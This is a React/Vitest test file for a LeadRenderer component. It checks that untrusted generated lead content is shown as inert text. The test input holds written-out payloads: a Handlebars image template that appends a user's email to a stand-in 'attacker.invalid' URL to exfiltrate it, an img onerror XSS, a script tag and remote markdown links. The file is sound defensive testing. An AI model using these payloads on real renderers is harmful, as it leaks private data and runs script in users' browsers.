/// <reference types="vitest" />
import { render, waitFor } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

vi.mock('@tui/core', () => ({
  useAppTheme: () => ({ isDark: false })
}));

vi.mock('mermaid', () => ({
  default: {
    initialize: vi.fn(),
    run: vi.fn()
  }
}));

vi.mock('components/elements/display/Notebook', () => ({
  Notebook: () => null
}));

vi.mock('components/elements/display/handlebars/helpers', () => ({
  HowlerHelperError: class HowlerHelperError extends Error {},
  useHelpers: () => [
    {
      keyword: 'join',
      callback: (left: string, right: string, options: { hash?: { sep?: string } }) =>
        [left, right].filter(Boolean).join(options.hash?.sep ?? '')
    }
  ]
}));

vi.mock('react-i18next', () => ({
  useTranslation: () => ({ t: (key: string) => key })
}));

vi.mock('react-pluggable', () => ({
  usePluginStore: () => ({ executeFunction: vi.fn() })
}));

import LeadRenderer from './LeadRenderer';

describe('LeadRenderer', () => {
  it('renders generated lead content without evaluating templates or loading active content', async () => {
    const { container } = render(
      <LeadRenderer
        lead={
          {
            format: 'markdown',
            content: [
              '{{img src=(join "https://attacker.invalid/" user.email)}}',
              '<img src="https://attacker.invalid/raw" onerror="alert(1)" />',
              '<script>alert(1)</script>',
              '![remote image](https://attacker.invalid/markdown)',
              '[external link](https://attacker.invalid/page)'
            ].join('\n\n'),
            metadata: JSON.stringify({ owner: 'howler.ai_triage', schema_version: 1 })
          } as any
        }
        hit={{ user: { email: 'private@howler.invalid' } } as any}
      />
    );

    await waitFor(() => expect(container.textContent).toContain('{{img src='));
    expect(container.textContent).not.toContain('private@howler.invalid');
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(container.querySelector('a[href*="attacker.invalid"]')).toBeNull();
  });

  it('keeps trusted lead templates working with their hit context', async () => {
    const { container } = render(
      <LeadRenderer
        lead={{ format: 'markdown', content: 'Owner: {{user.email}}', metadata: '{}' } as any}
        hit={{ user: { email: 'analyst@howler.invalid' } } as any}
      />
    );

    await waitFor(() => expect(container.textContent).toContain('analyst@howler.invalid'));
  });
});
